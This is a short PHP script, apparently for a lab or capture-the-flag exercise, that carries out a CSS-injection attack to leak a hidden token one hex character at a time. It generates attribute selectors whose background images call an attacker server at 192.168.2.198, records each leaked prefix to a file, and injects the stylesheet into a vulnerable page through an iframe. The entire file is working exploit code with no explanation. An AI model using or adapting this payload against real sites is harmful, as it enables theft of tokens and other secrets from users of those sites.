<?php

if (isset($_GET['x'])) {
  $f = fopen('token', 'w');
  fwrite($f, $_GET['x']);
  fclose($f);
  die('');
}

$token = file_get_contents('token');
$xx = '';

for ($i = 0; $i < 0x10; $i++) {
  $g = dechex($i);
  $xx .= 'input[value^="'.$token.$g.'"] { background-image: url(http://192.168.2.198:8888/attack.php?x='.$token.$g.'); }';
}

$css = <<<CSS
}
body { }
body { }

$xx

{

CSS;
$css = urlencode($css);

$payload = '<link type="text/css" href="/app.php?msg='.$css.'" rel="stylesheet">';
$payload = urlencode($payload);

?>

<iframe src="http://127.0.0.1:8888/app.php?msg=<?=$payload ?>"></iframe>




